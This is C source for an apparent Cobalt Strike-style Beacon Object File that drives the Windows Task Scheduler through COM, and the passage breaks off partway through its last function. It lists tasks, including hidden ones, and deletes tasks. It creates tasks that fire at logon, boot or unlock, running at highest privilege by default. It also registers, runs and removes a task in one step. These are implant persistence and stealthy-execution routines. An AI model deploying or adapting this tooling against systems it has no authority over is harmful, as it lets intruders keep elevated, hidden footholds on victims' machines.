#define SECURITY_WIN32
#include <windows.h>
#include <taskschd.h>
#include "beacon.h"
#include "bofdefs.h"

// Converts a BSTR (UTF-16) to a newly allocated ANSI char buffer. Free with intFree.
char *bstrToChar(BSTR bstr) {
    if (bstr == NULL) {
        return NULL;
    }

    int len = KERNEL32$WideCharToMultiByte(CP_ACP, 0, bstr, -1, NULL, 0, NULL, NULL);
    if (len <= 0) {
        return NULL;
    }

    char *out = (char *)intAlloc(len);
    if (out == NULL) {
        return NULL;
    }

    KERNEL32$WideCharToMultiByte(CP_ACP, 0, bstr, -1, out, len, NULL, NULL);
    return out;
}

// Case-insensitive substring search (ASCII fold). Returns pointer into haystack, or NULL.
char *striFind(const char *haystack, const char *needle) {
    if (needle == NULL || needle[0] == '\0') {
        return (char *)haystack;
    }
    if (haystack == NULL) {
        return NULL;
    }

    for (; *haystack; haystack++) {
        const char *h = haystack;
        const char *n = needle;
        while (*h && *n) {
            char a = *h;
            char b = *n;
            if (a >= 'A' && a <= 'Z') a = (char)(a + 32);
            if (b >= 'A' && b <= 'Z') b = (char)(b + 32);
            if (a != b) break;
            h++;
            n++;
        }
        if (*n == '\0') {
            return (char *)haystack;
        }
    }
    return NULL;
}

// Maps a TASK_STATE to a printable label.
const char *taskStateStr(TASK_STATE s) {
    switch (s) {
        case TASK_STATE_DISABLED: return "Disabled";
        case TASK_STATE_QUEUED:   return "Queued";
        case TASK_STATE_READY:    return "Ready";
        case TASK_STATE_RUNNING:  return "Running";
        default:                  return "Unknown";
    }
}

// Converts a char string to a BSTR
BSTR charToBSTR(const char *input) {
    if (input == NULL) {
        return NULL;
    }

    int len = KERNEL32$MultiByteToWideChar(CP_ACP, 0, input, -1, NULL, 0);
    if (len == 0) {
        return NULL;
    }

    wchar_t *wString = (wchar_t *)OLE32$CoTaskMemAlloc(len * sizeof(wchar_t));
    if (wString == NULL) {
        return NULL;
    }

    KERNEL32$MultiByteToWideChar(CP_ACP, 0, input, -1, wString, len);
    BSTR bstr = OLEAUT32$SysAllocString(wString);
    OLE32$CoTaskMemFree(wString);

    return bstr;
}

// Retrieves the current user's name in the specified format
char *GetUser(EXTENDED_NAME_FORMAT NameFormat) {
    char *UsrBuf = intAlloc(MAX_PATH);
    ULONG UsrSiz = MAX_PATH;

    if (UsrBuf == NULL) {
        return NULL;
    }

    if (SECUR32$GetUserNameExA(NameFormat, UsrBuf, &UsrSiz)) {
        return UsrBuf;
    }

    intFree(UsrBuf);
    return NULL;
}

// Retrieves token information for the current process
VOID *GetTokenInfo(TOKEN_INFORMATION_CLASS TokenType) {
    HANDLE hToken = 0;
    DWORD dwLength = 0;
    VOID *pTokenInfo = NULL;

    if (ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_READ, &hToken)) {
        ADVAPI32$GetTokenInformation(hToken, TokenType, NULL, 0, &dwLength);

        if (KERNEL32$GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
            pTokenInfo = intAlloc(dwLength);
            if (pTokenInfo == NULL) {
                KERNEL32$CloseHandle(hToken);
                return NULL;
            }
        }

        if (!ADVAPI32$GetTokenInformation(hToken, TokenType, (LPVOID)pTokenInfo, dwLength, &dwLength)) {
            intFree(pTokenInfo);
            pTokenInfo = NULL;
        }

        KERNEL32$CloseHandle(hToken);
    }

    return pTokenInfo;
}

// Retrieves user information and stores it in userStr
void GetUserInfo(char **userStr) {
    PTOKEN_USER pUserInfo = NULL;
    *userStr = NULL;

    pUserInfo = (PTOKEN_USER)GetTokenInfo(TokenUser);
    if (pUserInfo == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to get token information.\n");
        return;
    }

    *userStr = GetUser(NameSamCompatible);
    if (*userStr == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to get user name.\n");
    }

    if (pUserInfo) {
        intFree(pUserInfo);
    }

    if (*userStr == NULL && *userStr) {
        intFree(*userStr);
        *userStr = NULL;
    }
}

// Enumerates tasks in a folder (and its subfolders) via COM, matching names/paths against filter.
// filter may be NULL/empty to show every task. Matches are appended to fmt; matchCount incremented.
void enumTasksInFolder(ITaskFolder *pFolder, const char *filter, formatp *fmt, DWORD *matchCount) {
    IRegisteredTaskCollection *pTasks = NULL;
    HRESULT hr = pFolder->lpVtbl->GetTasks(pFolder, TASK_ENUM_HIDDEN, &pTasks);
    if (SUCCEEDED(hr) && pTasks != NULL) {
        LONG count = 0;
        pTasks->lpVtbl->get_Count(pTasks, &count);

        for (LONG i = 1; i <= count; i++) {
            VARIANT idx;
            OLEAUT32$VariantInit(&idx);
            idx.vt = VT_I4;
            idx.lVal = i;

            IRegisteredTask *pTask = NULL;
            if (FAILED(pTasks->lpVtbl->get_Item(pTasks, idx, &pTask)) || pTask == NULL) {
                continue;
            }

            BSTR bName = NULL;
            BSTR bPath = NULL;
            TASK_STATE state = TASK_STATE_UNKNOWN;
            VARIANT_BOOL enabled = VARIANT_FALSE;

            pTask->lpVtbl->get_Name(pTask, &bName);
            pTask->lpVtbl->get_Path(pTask, &bPath);
            pTask->lpVtbl->get_State(pTask, &state);
            pTask->lpVtbl->get_Enabled(pTask, &enabled);

            char *name = bstrToChar(bName);
            char *path = bstrToChar(bPath);

            int show = (filter == NULL || filter[0] == '\0');
            if (!show) {
                if (name && striFind(name, filter)) show = 1;
                else if (path && striFind(path, filter)) show = 1;
            }

            if (show) {
                BeaconFormatPrintf(fmt, "  [%-8s] Enabled=%-3s  %s\n",
                    taskStateStr(state),
                    enabled == VARIANT_FALSE ? "No" : "Yes",
                    path ? path : (name ? name : "<unknown>"));
                (*matchCount)++;
            }

            if (bName) OLEAUT32$SysFreeString(bName);
            if (bPath) OLEAUT32$SysFreeString(bPath);
            if (name) intFree(name);
            if (path) intFree(path);
            pTask->lpVtbl->Release(pTask);
        }
        pTasks->lpVtbl->Release(pTasks);
    }

    ITaskFolderCollection *pFolders = NULL;
    hr = pFolder->lpVtbl->GetFolders(pFolder, 0, &pFolders);
    if (SUCCEEDED(hr) && pFolders != NULL) {
        LONG fcount = 0;
        pFolders->lpVtbl->get_Count(pFolders, &fcount);

        for (LONG i = 1; i <= fcount; i++) {
            VARIANT idx;
            OLEAUT32$VariantInit(&idx);
            idx.vt = VT_I4;
            idx.lVal = i;

            ITaskFolder *pChild = NULL;
            if (SUCCEEDED(pFolders->lpVtbl->get_Item(pFolders, idx, &pChild)) && pChild != NULL) {
                enumTasksInFolder(pChild, filter, fmt, matchCount);
                pChild->lpVtbl->Release(pChild);
            }
        }
        pFolders->lpVtbl->Release(pFolders);
    }
}

// Lists scheduled tasks via COM. If filter is non-empty, only tasks whose name or full path
// contain it (case-insensitive) are printed.
DWORD listTasks(char *filter) {
    VARIANT Nullv;
    OLEAUT32$VariantInit(&Nullv);
    Nullv.vt = VT_EMPTY;

    IID CTaskScheduler = {0x0f87369f, 0xa4e5, 0x4cfc, {0xbd, 0x3e, 0x73, 0xe6, 0x15, 0x45, 0x72, 0xdd}};
    IID IIDTaskService = {0x2faba4c7, 0x4da9, 0x4013, {0x96, 0x97, 0x20, 0xcc, 0x3f, 0xd4, 0x0f, 0x85}};

    HRESULT hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to initialize COM library: 0x%lX\n", hr);
        return (DWORD)hr;
    }

    ITaskService *pService = NULL;
    hr = OLE32$CoCreateInstance(&CTaskScheduler, NULL, CLSCTX_INPROC_SERVER, &IIDTaskService, (void **)&pService);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to create an instance of ITaskService. Ensure Task Scheduler service is running: 0x%lX\n", hr);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    hr = pService->lpVtbl->Connect(pService, Nullv, Nullv, Nullv, Nullv);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "ITaskService->Connect failed. Could not connect to Task Scheduler service: 0x%lX\n", hr);
        pService->lpVtbl->Release(pService);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    ITaskFolder *pRootFolder = NULL;
    BSTR rootFolderPath = OLEAUT32$SysAllocString(L"\\");
    hr = pService->lpVtbl->GetFolder(pService, rootFolderPath, &pRootFolder);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Cannot get Root Folder pointer. Check if the Task Scheduler service is accessible: 0x%lX\n", hr);
        OLEAUT32$SysFreeString(rootFolderPath);
        pService->lpVtbl->Release(pService);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    formatp fmt;
    BeaconFormatAlloc(&fmt, 1024 * 64);

    if (filter != NULL && filter[0] != '\0') {
        BeaconFormatPrintf(&fmt, "Listing scheduled tasks (filter: \"%s\"):\n", filter);
    } else {
        BeaconFormatPrintf(&fmt, "Listing scheduled tasks:\n");
    }

    DWORD matchCount = 0;
    enumTasksInFolder(pRootFolder, filter, &fmt, &matchCount);

    BeaconFormatPrintf(&fmt, "\n[+] %lu task(s) matched.\n", matchCount);

    int outLen = 0;
    char *outStr = BeaconFormatToString(&fmt, &outLen);
    BeaconOutput(CALLBACK_OUTPUT, outStr, outLen);
    BeaconFormatFree(&fmt);

    pRootFolder->lpVtbl->Release(pRootFolder);
    OLEAUT32$SysFreeString(rootFolderPath);
    pService->lpVtbl->Release(pService);
    OLE32$CoUninitialize();

    return (DWORD)hr;
}

// Removes a scheduled task
DWORD removeTask(char *taskName) {
    VARIANT Nullv;
    OLEAUT32$VariantInit(&Nullv);
    Nullv.vt = VT_EMPTY;

    IID CTaskScheduler = {0x0f87369f, 0xa4e5, 0x4cfc, {0xbd, 0x3e, 0x73, 0xe6, 0x15, 0x45, 0x72, 0xdd}};
    IID IIDTaskService = {0x2faba4c7, 0x4da9, 0x4013, {0x96, 0x97, 0x20, 0xcc, 0x3f, 0xd4, 0x0f, 0x85}};

    HRESULT hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to initialize COM library: 0x%lX\n", hr);
        return (DWORD)hr;
    }

    ITaskService *pService = NULL;
    hr = OLE32$CoCreateInstance(&CTaskScheduler, NULL, CLSCTX_INPROC_SERVER, &IIDTaskService, (void **)&pService);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to create an instance of ITaskService. Ensure Task Scheduler service is running: 0x%lX\n", hr);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    hr = pService->lpVtbl->Connect(pService, Nullv, Nullv, Nullv, Nullv);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "ITaskService->Connect failed. Could not connect to Task Scheduler service: 0x%lX\n", hr);
        pService->lpVtbl->Release(pService);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    ITaskFolder *pRootFolder = NULL;
    BSTR rootFolderPath = OLEAUT32$SysAllocString(L"\\");
    hr = pService->lpVtbl->GetFolder(pService, rootFolderPath, &pRootFolder);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Cannot get Root Folder pointer. Check if the Task Scheduler service is accessible: 0x%lX\n", hr);
        pService->lpVtbl->Release(pService);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    BSTR bStrTaskName = charToBSTR(taskName);
    hr = pRootFolder->lpVtbl->DeleteTask(pRootFolder, bStrTaskName, 0);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Error removing task '%s'. Ensure the task exists and you have the necessary permissions: 0x%lx\n", taskName, hr);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Task '%s' successfully removed.\n", taskName);
    }

    pRootFolder->lpVtbl->Release(pRootFolder);
    pService->lpVtbl->Release(pService);
    OLEAUT32$SysFreeString(bStrTaskName);
    OLEAUT32$SysFreeString(rootFolderPath);
    OLE32$CoUninitialize();

    return (DWORD)hr;
}

// Creates a scheduled task
DWORD createTask(char *taskName, char *command, char *arguments, char *workingDir, char *triggerType, BOOL noElevate) {
    VARIANT Nullv;
    OLEAUT32$VariantInit(&Nullv);
    Nullv.vt = VT_EMPTY;
    char *userStr = NULL;

    IID CTaskScheduler = {0x0f87369f, 0xa4e5, 0x4cfc, {0xbd, 0x3e, 0x73, 0xe6, 0x15, 0x45, 0x72, 0xdd}};
    IID IIDTaskService = {0x2faba4c7, 0x4da9, 0x4013, {0x96, 0x97, 0x20, 0xcc, 0x3f, 0xd4, 0x0f, 0x85}};
    IID IIDLogonTrigger = {0x72dade38, 0xfae4, 0x4b3e, {0xba, 0xf4, 0x5d, 0x00, 0x9a, 0xf0, 0x2b, 0x1c}};
    IID IIDBootTrigger = {0x2a9c35da, 0xd357, 0x41f4, {0xbb, 0xc1, 0x20, 0x7a, 0xc1, 0xb1, 0xf3, 0xcb}};
    IID IIDSessionStateChangeTrigger = {0x754da71b, 0x4385, 0x4475, {0x9d, 0xd9, 0x59, 0x82, 0x94, 0xfa, 0x36, 0x41}};
    IID IIDExecAction = {0x4c3d624d, 0xfd6b, 0x49a3, {0xb9, 0xb7, 0x09, 0xcb, 0x3c, 0xd3, 0xf0, 0x47}};

    HRESULT hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to initialize COM library: 0x%lX\n", hr);
        return (DWORD)hr;
    }

    ITaskService *pService = NULL;
    hr = OLE32$CoCreateInstance(&CTaskScheduler, NULL, CLSCTX_INPROC_SERVER, &IIDTaskService, (void **)&pService);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to create an instance of ITaskService. Ensure Task Scheduler service is running: 0x%lX\n", hr);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    hr = pService->lpVtbl->Connect(pService, Nullv, Nullv, Nullv, Nullv);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "ITaskService->Connect failed. Could not connect to Task Scheduler service: 0x%lX\n", hr);
        pService->lpVtbl->Release(pService);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    ITaskFolder *pRootFolder = NULL;
    BSTR rootFolderPath = OLEAUT32$SysAllocString(L"\\");
    hr = pService->lpVtbl->GetFolder(pService, rootFolderPath, &pRootFolder);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Cannot get Root Folder pointer. Check if the Task Scheduler service is accessible: 0x%lX\n", hr);
        pService->lpVtbl->Release(pService);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    ITaskDefinition *pTask = NULL;
    hr = pService->lpVtbl->NewTask(pService, 0, &pTask);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Cannot create a new task definition: 0x%lx\n", hr);
        pRootFolder->lpVtbl->Release(pRootFolder);
        pService->lpVtbl->Release(pService);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    GetUserInfo(&userStr);

    IPrincipal *pPrincipal = NULL;
    hr = pTask->lpVtbl->get_Principal(pTask, &pPrincipal);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Cannot get principal pointer: 0x%lx\n", hr);
        pTask->lpVtbl->Release(pTask);
        pRootFolder->lpVtbl->Release(pRootFolder);
        pService->lpVtbl->Release(pService);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    BSTR userBstr = charToBSTR(userStr);
    pPrincipal->lpVtbl->put_UserId(pPrincipal, userBstr);
    pPrincipal->lpVtbl->put_LogonType(pPrincipal, TASK_LOGON_INTERACTIVE_TOKEN);
    if (!noElevate) {
        pPrincipal->lpVtbl->put_RunLevel(pPrincipal, TASK_RUNLEVEL_HIGHEST);
    }

    ITriggerCollection *pTriggerCollection = NULL;
    hr = pTask->lpVtbl->get_Triggers(pTask, &pTriggerCollection);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Cannot get triggers collection: 0x%lx\n", hr);
        pPrincipal->lpVtbl->Release(pPrincipal);
        pTask->lpVtbl->Release(pTask);
        pRootFolder->lpVtbl->Release(pRootFolder);
        pService->lpVtbl->Release(pService);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    TASK_TRIGGER_TYPE2 triggerEnum;
    if (MSVCRT$strcmp(triggerType, "boot") == 0) {
        triggerEnum = TASK_TRIGGER_BOOT;
    } else if (MSVCRT$strcmp(triggerType, "unlock") == 0) {
        triggerEnum = TASK_TRIGGER_SESSION_STATE_CHANGE;
    } else {
        triggerEnum = TASK_TRIGGER_LOGON;
    }

    ITrigger *pTrigger = NULL;
    hr = pTriggerCollection->lpVtbl->Create(pTriggerCollection, triggerEnum, &pTrigger);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Cannot create trigger: 0x%lx\n", hr);
        pTriggerCollection->lpVtbl->Release(pTriggerCollection);
        pPrincipal->lpVtbl->Release(pPrincipal);
        pTask->lpVtbl->Release(pTask);
        pRootFolder->lpVtbl->Release(pRootFolder);
        pService->lpVtbl->Release(pService);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    BSTR triggerId = charToBSTR(taskName);

    if (triggerEnum == TASK_TRIGGER_LOGON) {
        ILogonTrigger *pLogonTrigger = NULL;
        hr = pTrigger->lpVtbl->QueryInterface(pTrigger, &IIDLogonTrigger, (void **)&pLogonTrigger);
        if (FAILED(hr)) {
            BeaconPrintf(CALLBACK_ERROR, "QueryInterface failed for ILogonTrigger: 0x%lx\n", hr);
            OLEAUT32$SysFreeString(triggerId);
            pTrigger->lpVtbl->Release(pTrigger);
            pTriggerCollection->lpVtbl->Release(pTriggerCollection);
            pPrincipal->lpVtbl->Release(pPrincipal);
            pTask->lpVtbl->Release(pTask);
            pRootFolder->lpVtbl->Release(pRootFolder);
            pService->lpVtbl->Release(pService);
            OLE32$CoUninitialize();
            return (DWORD)hr;
        }
        pLogonTrigger->lpVtbl->put_Id(pLogonTrigger, triggerId);
        pLogonTrigger->lpVtbl->put_Enabled(pLogonTrigger, TRUE);
        pLogonTrigger->lpVtbl->put_UserId(pLogonTrigger, userBstr);
        pLogonTrigger->lpVtbl->Release(pLogonTrigger);
    } else if (triggerEnum == TASK_TRIGGER_BOOT) {
        IBootTrigger *pBootTrigger = NULL;
        hr = pTrigger->lpVtbl->QueryInterface(pTrigger, &IIDBootTrigger, (void **)&pBootTrigger);
        if (FAILED(hr)) {
            BeaconPrintf(CALLBACK_ERROR, "QueryInterface failed for IBootTrigger: 0x%lx\n", hr);
            OLEAUT32$SysFreeString(triggerId);
            pTrigger->lpVtbl->Release(pTrigger);
            pTriggerCollection->lpVtbl->Release(pTriggerCollection);
            pPrincipal->lpVtbl->Release(pPrincipal);
            pTask->lpVtbl->Release(pTask);
            pRootFolder->lpVtbl->Release(pRootFolder);
            pService->lpVtbl->Release(pService);
            OLE32$CoUninitialize();
            return (DWORD)hr;
        }
        pBootTrigger->lpVtbl->put_Id(pBootTrigger, triggerId);
        pBootTrigger->lpVtbl->put_Enabled(pBootTrigger, TRUE);
        pBootTrigger->lpVtbl->Release(pBootTrigger);
    } else if (triggerEnum == TASK_TRIGGER_SESSION_STATE_CHANGE) {
        ISessionStateChangeTrigger *pUnlockTrigger = NULL;
        hr = pTrigger->lpVtbl->QueryInterface(pTrigger, &IIDSessionStateChangeTrigger, (void **)&pUnlockTrigger);
        if (FAILED(hr)) {
            BeaconPrintf(CALLBACK_ERROR, "QueryInterface failed for ISessionStateChangeTrigger: 0x%lx\n", hr);
            OLEAUT32$SysFreeString(triggerId);
            pTrigger->lpVtbl->Release(pTrigger);
            pTriggerCollection->lpVtbl->Release(pTriggerCollection);
            pPrincipal->lpVtbl->Release(pPrincipal);
            pTask->lpVtbl->Release(pTask);
            pRootFolder->lpVtbl->Release(pRootFolder);
            pService->lpVtbl->Release(pService);
            OLE32$CoUninitialize();
            return (DWORD)hr;
        }
        pUnlockTrigger->lpVtbl->put_Id(pUnlockTrigger, triggerId);
        pUnlockTrigger->lpVtbl->put_Enabled(pUnlockTrigger, TRUE);
        pUnlockTrigger->lpVtbl->put_UserId(pUnlockTrigger, userBstr);
        pUnlockTrigger->lpVtbl->put_StateChange(pUnlockTrigger, TASK_SESSION_UNLOCK);
        pUnlockTrigger->lpVtbl->Release(pUnlockTrigger);
    }

    OLEAUT32$SysFreeString(triggerId);

    IActionCollection *pActionCollection = NULL;
    hr = pTask->lpVtbl->get_Actions(pTask, &pActionCollection);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Cannot get action collection: 0x%lx\n", hr);
        pTrigger->lpVtbl->Release(pTrigger);
        pTriggerCollection->lpVtbl->Release(pTriggerCollection);
        pPrincipal->lpVtbl->Release(pPrincipal);
        pTask->lpVtbl->Release(pTask);
        pRootFolder->lpVtbl->Release(pRootFolder);
        pService->lpVtbl->Release(pService);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    IAction *pAction = NULL;
    hr = pActionCollection->lpVtbl->Create(pActionCollection, TASK_ACTION_EXEC, &pAction);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Cannot create action: 0x%lx\n", hr);
        pActionCollection->lpVtbl->Release(pActionCollection);
        pTrigger->lpVtbl->Release(pTrigger);
        pTriggerCollection->lpVtbl->Release(pTriggerCollection);
        pPrincipal->lpVtbl->Release(pPrincipal);
        pTask->lpVtbl->Release(pTask);
        pRootFolder->lpVtbl->Release(pRootFolder);
        pService->lpVtbl->Release(pService);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    IExecAction *pExecAction = NULL;
    hr = pAction->lpVtbl->QueryInterface(pAction, &IIDExecAction, (void **)&pExecAction);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "QueryInterface call failed for IExecAction: 0x%lx\n", hr);
        pAction->lpVtbl->Release(pAction);
        pActionCollection->lpVtbl->Release(pActionCollection);
        pTrigger->lpVtbl->Release(pTrigger);
        pTriggerCollection->lpVtbl->Release(pTriggerCollection);
        pPrincipal->lpVtbl->Release(pPrincipal);
        pTask->lpVtbl->Release(pTask);
        pRootFolder->lpVtbl->Release(pRootFolder);
        pService->lpVtbl->Release(pService);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    BSTR execPath = charToBSTR(command);
    pExecAction->lpVtbl->put_Path(pExecAction, execPath);

    BSTR execArgs = NULL;
    if (arguments != NULL && arguments[0] != '\0') {
        execArgs = charToBSTR(arguments);
        pExecAction->lpVtbl->put_Arguments(pExecAction, execArgs);
    }

    BSTR execWorkDir = NULL;
    if (workingDir != NULL && workingDir[0] != '\0') {
        execWorkDir = charToBSTR(workingDir);
        pExecAction->lpVtbl->put_WorkingDirectory(pExecAction, execWorkDir);
    }

    IRegisteredTask *pRegisteredTask = NULL;
    BSTR bStrTaskName = charToBSTR(taskName);
    hr = pRootFolder->lpVtbl->RegisterTaskDefinition(pRootFolder, bStrTaskName, pTask, TASK_CREATE_OR_UPDATE, Nullv, Nullv, TASK_LOGON_INTERACTIVE_TOKEN, Nullv, &pRegisteredTask);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Error saving task. Ensure you have the necessary permissions: 0x%lx\n", hr);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Task \"%s\" successfully registered [trigger: %s]:\n%s\n", taskName, triggerType, command);
    }

    if (pRegisteredTask) {
        pRegisteredTask->lpVtbl->Release(pRegisteredTask);
    }

    pExecAction->lpVtbl->Release(pExecAction);
    pAction->lpVtbl->Release(pAction);
    pActionCollection->lpVtbl->Release(pActionCollection);
    pTrigger->lpVtbl->Release(pTrigger);
    pTriggerCollection->lpVtbl->Release(pTriggerCollection);
    pPrincipal->lpVtbl->Release(pPrincipal);
    pTask->lpVtbl->Release(pTask);
    pRootFolder->lpVtbl->Release(pRootFolder);
    pService->lpVtbl->Release(pService);
    OLEAUT32$SysFreeString(bStrTaskName);
    OLEAUT32$SysFreeString(execPath);
    if (execArgs) OLEAUT32$SysFreeString(execArgs);
    if (execWorkDir) OLEAUT32$SysFreeString(execWorkDir);
    OLEAUT32$SysFreeString(userBstr);
    OLEAUT32$SysFreeString(rootFolderPath);
    if (userStr) {
        KERNEL32$LocalFree(userStr);
    }
    OLE32$CoUninitialize();

    return (DWORD)hr;
}

// Registers a single on-demand task, runs it, then removes it. Short delays between stages
// give the Task Scheduler service time to settle the registration / launch before the next call.
DWORD execTask(char *taskName, char *command, char *arguments, char *workingDir, BOOL noElevate) {
    VARIANT Nullv;
    OLEAUT32$VariantInit(&Nullv);
    Nullv.vt = VT_EMPTY;
    char *userStr = NULL;

    IID CTaskScheduler = {0x0f87369f, 0xa4e5, 0x4cfc, {0xbd, 0x3e, 0x73, 0xe6, 0x15, 0x45, 0x72, 0xdd}};
    IID IIDTaskService = {0x2faba4c7, 0x4da9, 0x4013, {0x96, 0x97, 0x20, 0xcc, 0x3f, 0xd4, 0x0f, 0x85}};
    IID IIDExecAction = {0x4c3d624d, 0xfd6b, 0x49a3, {0xb9, 0xb7, 0x09, 0xcb, 0x3c, 0xd3, 0xf0, 0x47}};

    HRESULT hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to initialize COM library: 0x%lX\n", hr);
        return (DWORD)hr;
    }

    ITaskService *pService = NULL;
    hr = OLE32$CoCreateInstance(&CTaskScheduler, NULL, CLSCTX_INPROC_SERVER, &IIDTaskService, (void **)&pService);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to create an instance of ITaskService. Ensure Task Scheduler service is running: 0x%lX\n", hr);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    hr = pService->lpVtbl->Connect(pService, Nullv, Nullv, Nullv, Nullv);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "ITaskService->Connect failed. Could not connect to Task Scheduler service: 0x%lX\n", hr);
        pService->lpVtbl->Release(pService);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    ITaskFolder *pRootFolder = NULL;
    BSTR rootFolderPath = OLEAUT32$SysAllocString(L"\\");
    hr = pService->lpVtbl->GetFolder(pService, rootFolderPath, &pRootFolder);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Cannot get Root Folder pointer. Check if the Task Scheduler service is accessible: 0x%lX\n", hr);
        OLEAUT32$SysFreeString(rootFolderPath);
        pService->lpVtbl->Release(pService);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    ITaskDefinition *pTask = NULL;
    hr = pService->lpVtbl->NewTask(pService, 0, &pTask);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Cannot create a new task definition: 0x%lx\n", hr);
        pRootFolder->lpVtbl->Release(pRootFolder);
        OLEAUT32$SysFreeString(rootFolderPath);
        pService->lpVtbl->Release(pService);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    GetUserInfo(&userStr);

    IPrincipal *pPrincipal = NULL;
    hr = pTask->lpVtbl->get_Principal(pTask, &pPrincipal);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Cannot get principal pointer: 0x%lx\n", hr);
        pTask->lpVtbl->Release(pTask);
        pRootFolder->lpVtbl->Release(pRootFolder);
        OLEAUT32$SysFreeString(rootFolderPath);
        pService->lpVtbl->Release(pService);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    BSTR userBstr = charToBSTR(userStr);
    pPrincipal->lpVtbl->put_UserId(pPrincipal, userBstr);
    pPrincipal->lpVtbl->put_LogonType(pPrincipal, TASK_LOGON_INTERACTIVE_TOKEN);
    if (!noElevate) {
        pPrincipal->lpVtbl->put_RunLevel(pPrincipal, TASK_RUNLEVEL_HIGHEST);
    }

    IActionCollection *pActionCollection = NULL;
    hr = pTask->lpVtbl->get_Actions(pTask, &pActionCollection);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Cannot get action collection: 0x%lx\n", hr);
        pPrincipal->lpVtbl->Release(pPrincipal);
        pTask->lpVtbl->Release(pTask);
        pRootFolder->lpVtbl->Release(pRootFolder);
        OLEAUT32$SysFreeString(rootFolderPath);
        OLEAUT32$SysFreeString(userBstr);
        if (userStr) KERNEL32$LocalFree(userStr);
        pService->lpVtbl->Release(pService);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    IAction *pAction = NULL;
    hr = pActionCollection->lpVtbl->Create(pActionCollection, TASK_ACTION_EXEC, &pAction);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Cannot create action: 0x%lx\n", hr);
        pActionCollection->lpVtbl->Release(pActionCollection);
        pPrincipal->lpVtbl->Release(pPrincipal);
        pTask->lpVtbl->Release(pTask);
        pRootFolder->lpVtbl->Release(pRootFolder);
        OLEAUT32$SysFreeString(rootFolderPath);
        OLEAUT32$SysFreeString(userBstr);
        if (userStr) KERNEL32$LocalFree(userStr);
        pService->lpVtbl->Release(pService);
        OLE32$CoUninitialize();
        return (DWORD)hr;
    }

    IExecAction *pExecAction = NULL;
    hr = pAction->lpVtbl->QueryInterface(pAction, &IIDExecAction, (void **)&pExecAction);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "QueryInterface call failed for IExecAction: 0x%lx\n", hr);
        pAction->lpVtbl->Release(pAction);
        pActionCollection->lpVtbl->Release(pActionCollection);
        pPrincipal->lpVtbl->Release(pPrincipal);
        pTask->lpVtbl->Release(pTask);
        pRootFolder->lpVtbl->Release(pRootFolder);
        OLEAUT32$SysFreeString(rootFolderPath);
        OLEAUT32$SysFreeString(userBstr);
        if (userStr) KERNEL32$LocalFree(userStr);
